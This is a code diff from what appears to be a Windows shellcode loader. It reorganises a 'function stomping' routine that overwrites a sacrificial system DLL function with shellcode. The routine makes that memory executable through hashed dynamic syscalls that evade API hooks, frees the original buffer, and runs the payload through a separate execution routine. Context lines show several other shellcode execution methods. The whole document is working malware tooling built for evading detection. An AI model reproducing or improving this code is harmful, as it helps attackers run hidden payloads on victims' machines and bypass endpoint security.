@@ -58,21 +58,6 @@ void WindowshookExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 	UnhookWindowsHookEx(hhk);
 }
 
-void localFuncStompingExec(LPVOID shellcode, SIZE_T shellcodeSize) {
-
-	LPVOID sacrificedAddr = &BluetoothFindDeviceClose;
-	DWORD	dwOldProtection = NULL;
-	SIZE_T size = shellcodeSize;
-
-	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr, NtProtectVirtualMemoryStruct.funcHash,
-		(HANDLE)-1, &sacrificedAddr, &size, PAGE_EXECUTE_READWRITE, &dwOldProtection);
-
-	memcpy(sacrificedAddr, shellcode, shellcodeSize);
-	typedef void (*BluetoothFindDeviceClose)();
-	BluetoothFindDeviceClose pFunc = (BluetoothFindDeviceClose)sacrificedAddr;
-	pFunc();
-
-}
 void EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 	DWORD dwOldProtection;
 	LPVOID lpMem = shellcode;
@@ -321,7 +306,29 @@ void EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 	default:
 		break;
 	}
-	
+
+}
+
+void localFuncStompingExec(LPVOID shellcode, SIZE_T shellcodeSize) {
+
+	LPVOID sacrificedAddr = &BluetoothFindDeviceClose;
+	DWORD	dwOldProtection = NULL;
+	SIZE_T size = shellcodeSize;
+
+	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr, NtProtectVirtualMemoryStruct.funcHash,
+		(HANDLE)-1, &sacrificedAddr, &size, PAGE_EXECUTE_READWRITE, &dwOldProtection);
+
+	memcpy(sacrificedAddr, shellcode, shellcodeSize);
+
+	size = 0;
+	status = dynamicInvoker.Invoke<NTSTATUS>(NtFreeVirtualMemoryStruct.funcAddr, NtFreeVirtualMemoryStruct.funcHash,
+	(HANDLE)-1, &shellcode, &size, MEM_RELEASE);
+
+	// typedef void (*BluetoothFindDeviceClose)();
+	// BluetoothFindDeviceClose pFunc = (BluetoothFindDeviceClose)sacrificedAddr;
+	// pFunc();
+	EnumExec(sacrificedAddr, shellcodeSize);
+
 }
 
 //void earlyBirdDebugApc(LPVOID shellcode, SIZE_T shellcodeSize) {
